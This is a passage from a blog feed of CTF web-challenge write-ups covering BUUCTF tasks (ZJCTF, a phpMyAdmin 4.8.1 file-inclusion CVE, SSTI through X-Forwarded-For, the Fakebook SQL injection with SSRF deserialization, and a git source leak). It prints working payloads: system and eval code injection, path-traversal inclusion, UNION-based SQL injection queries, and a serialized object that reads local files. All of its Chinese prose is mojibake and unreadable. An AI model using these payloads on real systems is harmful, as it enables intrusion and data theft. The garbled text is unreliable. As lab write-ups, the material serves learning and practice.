plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><p><img src="/2021/08/06/buu/8/image-20210806091905315.png" alt="image-20210806091905315"></p><p><strong>payload2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*&#x3D;$&#123;eval($_POST[cmd])&#125;</span><br></pre></td></tr></table></figure><p>è¾“é”™å°±ä¼šÂ·æç¤ºç›¸å…³å‡½æ•°è¿‡æ»¤ï¼ˆè¿™é‡Œæˆ‘æ˜¯æ–œæ†çš„ç¬¦å·æ–¹å‘è¾“é”™å¯¼è‡´è¢«åŒ¹é…è¿‡æ»¤ï¼‰</p><p><img src="/2021/08/06/buu/8/image-20210806092259983.png" alt="image-20210806092259983"></p><p>ä¸Šä¼ æˆåŠŸï¼š</p><p><img src="/2021/08/06/buu/8/image-20210806092509267.png" alt="image-20210806092509267"></p><p><img src="/2021/08/06/buu/8/image-20210806092557240.png" alt="image-20210806092557240"></p><p>æˆ–è€…</p><p><img src="/2021/08/06/buu/8/image-20210806092640868.png" alt="image-20210806092640868"></p><p>å€Ÿé‰´åšå®¢ï¼š[<a href="https://blog.csdn.net/qq_48008847/article/details/118804275">BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤1_åä¹ä¸çŒç¡çš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF 2019 æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“&amp;BJDCTF2020 The mystery of ip</title>
      <link href="/2021/08/03/buu/7/"/>
      <url>/2021/08/03/buu/7/</url>
      
        <content type="html"><![CDATA[<h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p>æ‰“å¼€é¡µé¢ï¼Œå¥‡æ€ªçš„ä¹±ç ï¼š</p><p><img src="/2021/08/03/buu/7/image-20210803200638733.png" alt="image-20210803200638733"></p><p>æ‰¾äº†ä¸€ä¸ªä¹±ç æ¢å¤é¡µé¢ï¼š<a href="http://www.mytju.com/classcode/tools/messycoderecover.asp">ä¹±ç æ¢å¤ (mytju.com)</a></p><p><img src="/2021/08/03/buu/7/image-20210803200740870.png" alt="image-20210803200740870"></p><p>åœ¨utf8æ ¼å¼ä¸‹ï¼Œåªå¾—åˆ°äº†æ— ç”¨ä¿¡æ¯ï¼šç©ºçš„æ•°æ®?æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“ï¼Œä½†é‡Œé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰~ä¸ä¿¡ä½ æ‰¾</p><p>åœ¨f12ä¹Ÿä¸è¡Œåï¼Œæˆ‘æœæ–­åœ°æ‹¿èµ·æ¥ç¥å™¨â€”â€”dirsearchï¼</p><p>ä¸€é€šæ‰«æåæœç„¶æœ‰äº†çœ‰ç›®ï¼š</p><p><img src="/2021/08/03/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(356).png"></p><p><img src="/2021/08/03/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(357).png"></p><p>è¿›å…¥åˆ°<a href="http://e8451be4-2c39-421e-888a-2f04ad6a6de6.node4.buuoj.cn/phpmyadmin/index.php">e8451be4-2c39-421e-888a-2f04ad6a6de6.node4.buuoj.cn / mysql | phpMyAdmin 4.8.1</a></p><p><img src="/2021/08/03/buu/7/image-20210803201030523.png" alt="image-20210803201030523"></p><p>ç†Ÿæ‚‰çš„phpmyadminæ•°æ®åº“é¡µé¢</p><p>ä½†æ˜¯åˆ°äº†è¿™é‡Œæˆ‘å°±æ‡µäº†ï¼Œå› ä¸ºæ²¡æœ‰è¶³å¤Ÿæƒé™å¥½åƒæŸ¥ä¸åˆ°flagåœ¨å“ª</p><p>æŸ¥çœ‹äº†wp</p><p>åŸæ¥è¿™ä¸ªç‰ˆæœ¬æ¼æ´å¯ä»¥åˆ©ç”¨ï¼ŒPhpMyadminåå°æ–‡ä»¶åŒ…å«æ¼æ´</p><h5 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h5><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">ã€é¦–å‘ã€‘phpmyadmin4.8.1åå°getshell (qq.com)</a></p><p><a href="https://www.jianshu.com/p/fb9c2ae16d09">cve-2018-12613-PhpMyadminåå°æ–‡ä»¶åŒ…å« - ç®€ä¹¦ (jianshu.com)</a></p><p>â€‹    index.phpä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $_REQUEST[&#39;target&#39;];</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å‚æ•°target</p><p>ç›¸å…³pocä»å‚è€ƒæ–‡ç« ä¸­å¯çŸ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;</span><br></pre></td></tr></table></figure><p>ç»è¿‡å°è¯•å‘ç°ï¼Œè¯»å–æ—¶å¯ä»¥å°½é‡å¤šä¸‹å‡ çº§ï¼ˆå¤š../../ï¼‰æ— å½±å“ï¼Œåä¹‹è‹¥å°‘äº†åˆ™ä¼šæŠ¥é”™</p><p>å¦‚ä¸‹å›¾</p><p><img src="/2021/08/03/buu/7/image-20210803202146319.png" alt="image-20210803202146319"></p><p><img src="/2021/08/03/buu/7/image-20210803202211040.png" alt="image-20210803202211040"></p><h5 id="Tipsï¼š"><a href="#Tipsï¼š" class="headerlink" title="Tipsï¼š"></a>Tipsï¼š</h5><p>å¦å¤–è¿˜æœ‰ä¸€ç§è§£æ³•ï¼Œæ¥è‡ªäºä¸Šé¢çš„ â€™é¦–å‘â€˜ é“¾æ¥</p><p>å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥æ•°æ®åº“ï¼Œç„¶ååœ¨æ–‡ä»¶åŒ…å«æ¼æ´ä½¿ä¹‹æˆåŠŸè®¿é—®ï¼Œèšå‰‘è¿æ¥ã€‚</p><p>å‚è€ƒåšå®¢ï¼š</p><p><a href="https://blog.csdn.net/SopRomeo/article/details/105536972">GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“_SopRomeoçš„åšå®¢-CSDNåšå®¢</a></p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="/2021/08/03/buu/7/image-20210804210338451.png" alt="image-20210804210338451"></p><p>åˆ†åˆ«æŸ¥çœ‹Flagã€Hint</p><p><img src="/2021/08/03/buu/7/image-20210804211511008.png" alt="image-20210804211511008"></p><p><img src="/2021/08/03/buu/7/image-20210804210443630.png" alt="image-20210804210443630"></p><p>çœ‹äº†æºç ï¼Œæ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨ä¿¡æ¯</p><p>æŸ¥çœ‹wpï¼ŒçŸ¥é“äº†æ ‡é¢˜çš„ipæœ‰æ‰€æŒ‡</p><p>æˆ‘ä»¬çš„ipèƒ½å¤Ÿè¢«è·å–ï¼Œæ€€ç–‘æ˜¯ä¸XFFæœ‰å…³</p><p>æ¥ç€æˆ‘ä»¬è¿›å…¥ç«ç‹éªŒè¯æƒ³æ³•</p><p>æ·»åŠ X-Forwarded-For:127.0.0.1</p><p><img src="/2021/08/03/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(366).png" alt="å±å¹•æˆªå›¾(366)"></p><p>çœ‹åˆ°å›æ˜¾æ˜¾ç¤ºï¼šYour IP is : 127.0.0.1</p><p>è¯´æ˜äº†æƒ³æ³•æ­£ç¡®</p><p>åˆ©ç”¨æ¨¡æ¿æ³¨å…¥</p><p><img src="/2021/08/03/buu/7/image-20210804211235273.png" alt="image-20210804211235273"></p><p><img src="/2021/08/03/buu/7/image-20210804211318879.png" alt="image-20210804211318879"></p><h5 id="çŸ¥è¯†ç‚¹ï¼šSSTIæ¨¡æ¿æ³¨å…¥"><a href="#çŸ¥è¯†ç‚¹ï¼šSSTIæ¨¡æ¿æ³¨å…¥" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼šSSTIæ¨¡æ¿æ³¨å…¥"></a>çŸ¥è¯†ç‚¹ï¼šSSTIæ¨¡æ¿æ³¨å…¥</h5><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTIï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰æ¼æ´ï¼ˆå…¥é—¨ç¯‡ï¼‰ - bmjoker - åšå®¢å›­ (cnblogs.com)</a></p><p><img src="/2021/08/03/buu/7/1625650-20200216204049347-1844990197.png" alt="img"></p><p>æ¨¡æ¿æ³¨å…¥æ¶‰åŠçš„æ˜¯æœåŠ¡ç«¯Webåº”ç”¨ä½¿ç”¨æ¨¡æ¿å¼•æ“æ¸²æŸ“ç”¨æˆ·è¯·æ±‚çš„è¿‡ç¨‹<br>æœåŠ¡ç«¯æŠŠç”¨æˆ·è¾“å…¥çš„å†…å®¹æ¸²æŸ“æˆæ¨¡æ¿å°±å¯èƒ½é€ æˆSSTI(Server-Side Template Injection)</p><h3 id="æ¨¡æ¿å¼•æ“"><a href="#æ¨¡æ¿å¼•æ“" class="headerlink" title="æ¨¡æ¿å¼•æ“"></a>æ¨¡æ¿å¼•æ“</h3><h5 id="å‚è€ƒåšå®¢ï¼š"><a href="#å‚è€ƒåšå®¢ï¼š" class="headerlink" title="å‚è€ƒåšå®¢ï¼š"></a>å‚è€ƒåšå®¢ï¼š</h5><p><a href="https://blog.csdn.net/fightte/article/details/117003439">BJDCTF2020]The mystery of ip_fightteçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12318630.html">BJDCTF2020]The mystery of ip - ç‹å¹ä¹‹ - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯ 2018 Fakebook</title>
      <link href="/2021/08/02/buu/6/"/>
      <url>/2021/08/02/buu/6/</url>
      
        <content type="html"><![CDATA[<h4 id="é¢˜è®°"><a href="#é¢˜è®°" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h4><p>å…ˆçºªå¿µä¸€ä¸‹å•Šï¼Œè°ƒè¯•äº†å¥½é•¿ä¸€æ®µæ—¶é—´æ‰æˆåŠŸçš„æ‰«æå·¥å…·<strong>dirsearch</strong></p><p>æ€»ç»“è¿è¡ŒæˆåŠŸçš„å‡ ä¸ªæ¡ä»¶ï¼š</p><p>1.å®‰è£…pythonç‰ˆæœ¬3.7åŠä»¥ä¸Šï¼Œä¸”è¦ç¡®ä¿cmdå‘½ä»¤è¡Œå†…é»˜è®¤ç‰ˆæœ¬æ­£ç¡®ï¼ˆå› ä¸ºä¹‹å‰æˆ‘ä¸ºäº†ä½¿ç”¨GitHackè€Œæ›´æ”¹äº†pythonè§£é‡Šå™¨ï¼‰ã€‚</p><p>2.é‡åˆ°å¦‚ä¸‹æŠ¥é”™æ—¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;D:\dirsearch\dirsearch.py&quot;, line 28, in &lt;module&gt;</span><br><span class="line">    from lib.controller.controller import Controller</span><br><span class="line">  File &quot;D:\dirsearch\lib\controller\__init__.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from .controller import Controller  # noqa: F401</span><br><span class="line">  File &quot;D:\dirsearch\lib\controller\controller.py&quot;, line 29, in &lt;module&gt;</span><br><span class="line">    from lib.connection.requester import Requester</span><br><span class="line">  File &quot;D:\dirsearch\lib\connection\requester.py&quot;, line 30, in &lt;module&gt;</span><br><span class="line">    from thirdparty.requests_ntlm import HttpNtlmAuth</span><br><span class="line">  File &quot;D:\dirsearch\thirdparty\requests_ntlm\__init__.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from .requests_ntlm import HttpNtlmAuth</span><br><span class="line">  File &quot;D:\dirsearch\thirdparty\requests_ntlm\requests_ntlm.py&quot;, line 5, in &lt;module&gt;</span><br><span class="line">    from cryptography import x509</span><br><span class="line">ModuleNotFoundError: No module named &#39;cryptography&#39;</span><br></pre></td></tr></table></figure><p>è¯´æ˜åº“æ²¡è£…ä¸Šï¼Œå¯ä»¥å»pycharmé‡Œè‡ªè¡Œå®‰è£…å®Œæ•´ã€‚</p><p>é™„ä¸Šå›¾:</p><p><img src="/2021/08/02/buu/6/image-20210802195925831.png"></p><p><img src="/2021/08/02/buu/6/image-20210802200037618.png"></p><p><img src="/2021/08/02/buu/6/image-20210802200638164.png"></p><p>dirseachè‡ªå¸¦çš„å­—å…¸åœ¨dbç›®å½•ä¸‹ï¼Œä½¿ç”¨æ ¼å¼ä»¥åŠå¸¸ç”¨å‚æ•°å¦‚ä¸‹ï¼š<br>py dirsearch.py<code>-</code>u [target url]<code>-</code>e<code>*</code></p><p><strong>-<code>uåé¢è·Ÿè¦æ‰«çš„url</code></strong></p><p><strong>-<code>eæ˜¯æŒ‡å®šçš„url</code></strong></p><p><strong>-<code>wæ˜¯æŒ‡å®šå­—å…¸</code></strong></p><p><strong>-<code>ré€’å½’ç›®å½•</code></strong></p><p><strong>-<code>random</code>-agentsä½¿ç”¨éšæœºUA</strong></p><p>è¿˜å¯ä»¥è°ƒä½çº¿ç¨‹ï¼šdirsearch.py -u url -e * â€“timeout=2 -t 1 -x 400,403,404,500,503,429</p><hr><h4 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p>æ‰“å¼€åæ³¨å†Œï¼ˆjoinï¼‰è¿›å…¥Â·é¡µé¢</p><p><img src="/2021/08/02/buu/6/image-20210803144611777.png" alt="image-20210803144611777"></p><p>ç‚¹å‡»å</p><p>å‘ç°äº†æ³¨å…¥ç‚¹ï¼š</p><p><img src="/2021/08/02/buu/6/image-20210803144818019.png" alt="image-20210803144818019"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**Notice**:  unserialize(): Error at offset 0 of 1 bytes in **&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php** on line **31**</span><br></pre></td></tr></table></figure><p>é¡µé¢å·¦ä¸Šæ–¹æç¤ºäº†æœ¬é¢˜å®é™…ä¸åºåˆ—åŒ–æœ‰å…³</p><p>æŸ¥çœ‹wpçŸ¥é“äº†è¦ç”¨dirsearchæ‰«æç›®å½•è·å–æºæ–‡ä»¶</p><p>å¦‚ä¸‹å›¾çŠ¶æ€ç å›å“200æ—¶ï¼Œå‡ºç°äº†robotsåè®®</p><p><img src="/2021/08/02/buu/6/image-20210802200638164.png" alt="image-20210802200638164"></p><p>æŒ‰ç…§æç¤ºè®¿é—®ä¸‹è½½user.php.bak</p><p><img src="/2021/08/02/buu/6/image-20210802200728401.png" alt="image-20210802200728401"></p><p>é‡å‘½åä¸ºuser.php,æºæ‰“å¼€ä»£ç ï¼š</p><p><img src="/2021/08/02/buu/6/image-20210802200825525.png" alt="image-20210802200825525"></p><h5 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h5><p><img src="/2021/08/02/buu/6/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="æ‘˜æŠ„ï¼š"><a href="#æ‘˜æŠ„ï¼š" class="headerlink" title="æ‘˜æŠ„ï¼š"></a>æ‘˜æŠ„ï¼š</h5><p>*<em>ã€</em>ã€‘curl_init ï¼š åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯ï¼Œä¾›curl_setopt(), curl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨ã€‚**</p><p>*<em>ã€</em>ã€‘curl_setopt ï¼š è¯·æ±‚ä¸€ä¸ªurlã€‚**<br><strong>å…¶ä¸­CURLOPT_URLè¡¨ç¤ºéœ€è¦è·å–çš„URLåœ°å€ï¼Œåé¢å°±æ˜¯è·Ÿä¸Šäº†å®ƒçš„å€¼ã€‚</strong></p><p>*<em>ã€</em>ã€‘CURLOPT_RETURNTRANSFER å°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥æ–‡ä»¶æµçš„å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚**</p><p>*<em>ã€</em>ã€‘curl_execï¼ŒæˆåŠŸæ—¶è¿”å› TRUEï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› FALSEã€‚ ç„¶è€Œï¼Œå¦‚æœ CURLOPT_RETURNTRANSFERé€‰é¡¹è¢«è®¾ç½®ï¼Œå‡½æ•°æ‰§è¡ŒæˆåŠŸæ—¶ä¼šè¿”å›æ‰§è¡Œçš„ç»“æœï¼Œå¤±è´¥æ—¶è¿”å› FALSE ã€‚**</p><p>*<em>ã€</em>ã€‘CURLINFO_HTTP_CODE ï¼šæœ€åä¸€ä¸ªæ”¶åˆ°çš„HTTPä»£ç ã€‚**<br><strong>curl_getinfoï¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›å®ƒçš„å€¼ï¼Œå› ä¸ºè®¾ç½®äº†CURLINFO_HTTP_CODEï¼Œæ‰€ä»¥æ˜¯è¿”å›çš„çŠ¶æ€ç ã€‚</strong></p><p><strong>å¦‚æœçŠ¶æ€ç ä¸æ˜¯404ï¼Œå°±è¿”å›execçš„ç»“æœã€‚</strong></p><p><img src="/2021/08/02/buu/6/20200420141747970.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>è¿™é‡Œè¯´æ˜äº†ä¼ çš„å‚æ•°æ˜¯blog</strong></p><p>é€šè¿‡åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“äº†è¿™é¢˜æ¶‰åŠååºåˆ—åŒ–å’Œssrf</p><h5 id="å®æ“ï¼š"><a href="#å®æ“ï¼š" class="headerlink" title="å®æ“ï¼š"></a>å®æ“ï¼š</h5><p>æˆ‘å…ˆç»§ç»­çˆ†ç ´</p><p><img src="/2021/08/02/buu/6/image-20210803145941495.png" alt="image-20210803145941495"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F; select 1,database(),3,4#</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æ•°æ®åº“åï¼šfakebook</p><p><img src="/2021/08/02/buu/6/image-20210803151032215.png" alt="image-20210803151032215"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F; select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;&#39;fakebook&#39;#</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¡¨åï¼šusers</p><p><img src="/2021/08/02/buu/6/image-20210803151215574.png" alt="image-20210803151215574"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F; select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br></pre></td></tr></table></figure><p>å¾—åˆ°åˆ—åï¼šno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</p><p><img src="/2021/08/02/buu/6/image-20210803151357937.png" alt="image-20210803151357937"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F; select 1,data,3,4 from users#</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,group_concat(no,username,passwd,data),3,4 from fakebook.users#</span><br></pre></td></tr></table></figure><p>å½“è¯•åˆ°dataæ—¶ï¼Œå‡ºç°äº†æˆ‘ä»¬æƒ³è¦çš„éƒ¨åˆ†åºåˆ—åŒ–æ•°æ®æ ¼å¼</p><p>O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:3:â€123â€;s:3:â€ageâ€;i:1;s:4:â€blogâ€;s:13:â€<a href="http://www.baidu.com&quot;;}/">www.baidu.com&quot;;}</a>            </p><p>è¿™æ—¶å€™å›åˆ°æºä»£ç ä¸Š</p><p>æˆ‘ä»¬æ¥ä¸€æ‰‹ååºåˆ—åŒ–æ“ä½œï¼š</p><p>æ³¨ï¼šæ–‡ä»¶è·¯å¾„æ˜¯æ‰«æåˆ°çš„ã€‚</p><p><img src="/2021/08/02/buu/6/image-20210803153246831.png" alt="image-20210803153246831"></p><p>åœ¨æœ¬åœ°wwwè®¿é—®fakebook.php</p><p><img src="/2021/08/02/buu/6/image-20210803153215829.png" alt="image-20210803153215829"></p><p>æ„é€ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union&#x2F;**&#x2F; select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/02/buu/6/image-20210803153757132.png" alt="image-20210803153757132"></p><p><img src="/2021/08/02/buu/6/image-20210803153814758.png" alt="image-20210803153814758"></p><p><img src="/2021/08/02/buu/6/image-20210803153834055.png" alt="image-20210803153834055"></p><p>æœ¬æ–‡å€Ÿé‰´å‡ ä¸ªå¤§ä½¬åšå®¢ï¼š</p><p><a href="https://blog.csdn.net/qq_43622442/article/details/105633194">ç½‘é¼æ¯ 2018]Fakebook_H9_dawnçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/karsa/p/12652311.html">ç½‘é¼æ¯ 2018]Fakebook - kar3a - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://cloud.tencent.com/developer/article/1682583">ç½‘é¼æ¯2018-Fakebook - äº‘+ç¤¾åŒº - è…¾è®¯äº‘ (tencent.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019 ç¦æ­¢å¥—å¨ƒ</title>
      <link href="/2021/08/01/buu/5/"/>
      <url>/2021/08/01/buu/5/</url>
      
        <content type="html"><![CDATA[<p>â€‹    é¶æœºå¯åŠ¨ï¼š</p><p><img src="/2021/08/01/buu/5/image-20210801193338875.png" alt="image-20210801193338875"></p><p>æŸ¥çœ‹äº†æºç æ— æœï¼Œåˆè¯•äº†ä¸€ä¸‹index.phpã€robotsåè®®ä¹‹ç±»çš„ä¹Ÿä¸è¡Œï¼Œå¾¡å‰‘æ²¡æœ‰æ‰«æå‡ºæ¥</p><p>æŸ¥çœ‹äº†wpæ‰çŸ¥é“è¿™æ˜¯gitæ³„éœ²ã€‚</p><h3 id="çŸ¥è¯†è¡¥å……ï¼š"><a href="#çŸ¥è¯†è¡¥å……ï¼š" class="headerlink" title="çŸ¥è¯†è¡¥å……ï¼š"></a>çŸ¥è¯†è¡¥å……ï¼š</h3><h4 id="ç®€è¿°-gitæ–‡ä»¶å¯¼è‡´çš„æºç æ³„éœ²"><a href="#ç®€è¿°-gitæ–‡ä»¶å¯¼è‡´çš„æºç æ³„éœ²" class="headerlink" title="ç®€è¿°.gitæ–‡ä»¶å¯¼è‡´çš„æºç æ³„éœ²"></a>ç®€è¿°.gitæ–‡ä»¶å¯¼è‡´çš„æºç æ³„éœ²</h4><p>.gitæ–‡ä»¶æ˜¯å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­ä½¿ç”¨ Git(åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ)åšå¼€å‘æ—¶äº§ç”Ÿçš„éšè—ç›®å½•ï¼Œè¯¥æ–‡ä»¶åŒ…å«ä¸€äº›ç‰ˆæœ¬ä¿¡æ¯å’Œç½‘ç«™æºç ï¼Œæ•°æ®åº“ä¿¡æ¯ç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p><h4 id="åŸç†åˆ©ç”¨"><a href="#åŸç†åˆ©ç”¨" class="headerlink" title="åŸç†åˆ©ç”¨"></a>åŸç†åˆ©ç”¨</h4><p>1ã€é€šå¸¸å¼€å‘äººå‘˜åœ¨å¼€å‘æ—¶ï¼Œé€šå¸¸å°†æºç æäº¤åˆ°è¿œç¨‹çš„æ‰˜ç®¡ç½‘ç«™ï¼ˆå¦‚Githubï¼‰æ–¹ä¾¿ç®¡ç†ä¸äº¤äº’ï¼Œç­‰åˆ°å¼€å‘æœ€åé˜¶æ®µï¼Œå†å°†æºç ä»è¿œç¨‹æœåŠ¡å™¨ä¸Šä¸‹è½½åˆ° web ç›®å½•ä¸‹ï¼Œ å¦‚æœå¼€å‘äººå‘˜å¿˜è®°å°†å…¶ä¸­çš„ .gitæ–‡ä»¶åˆ é™¤ï¼Œåˆ™å¯ä»¥é€šè¿‡ .gitæ–‡ä»¶æ¢å¤ç½‘ç«™æºç ï¼Œæ¥è·å–ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼›<br>2ã€å¼€å‘äººå‘˜å¯¹ç«™ç‚¹ä½¿ç”¨ Git å¯¹ç‰ˆæœ¬è¿›è¡Œæ§åˆ¶ï¼Œå®ç°è‡ªåŠ¨éƒ¨ç½²ï¼Œå¦‚æœé…ç½®ä¸å½“ï¼Œç›´æ¥å°† .gitæ–‡ä»¶åŠ è½½åˆ°çº¿ä¸Šç¯å¢ƒï¼Œè¿™æ ·ä¾¿å¼•èµ·äº†.gitæ–‡ä»¶æ³„éœ²ã€‚</p><p>è¿™æ—¶å€™æˆ‘ä»¬ç”¨äº†åä¸ºGitHackçš„å·¥å…·</p><p>(éœ€è¦pythonç‰ˆæœ¬ä¸º2æ‰“å¤´çš„ï¼Œå› ä¸ºä½œè€…å†™çš„æ—¶å€™ä¼°è®¡pythonè§£é‡Šå™¨æ˜¯å‚è€ƒpython2çš„æ‰€ä»¥ç”¨python3ä¼šæŠ¥é”™,ä¸‹è½½åœ°å€ä¸ºï¼š<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>)</p><p>è¿›è¡Œäº†æ‰«æï¼Œè·å–æºæ–‡ä»¶ï¼š</p><p><img src="/2021/08/01/buu/5/image-20210801194006477.png" alt="image-20210801194006477"></p><p><img src="/2021/08/01/buu/5/image-20210801194541670.png" alt="image-20210801194541670"></p><p>æºç å¦‚ä¸‹ï¼š</p><?phpinclude "flag.php";echo "flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ<br>";if(isset($_GET['exp'])){    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {                // echo $_GET['exp'];                @eval($_GET['exp']);            }            else{                die("è¿˜å·®ä¸€ç‚¹å“¦ï¼");            }        }        else{            die("å†å¥½å¥½æƒ³æƒ³ï¼");        }    }    else{        die("è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼");    }}// 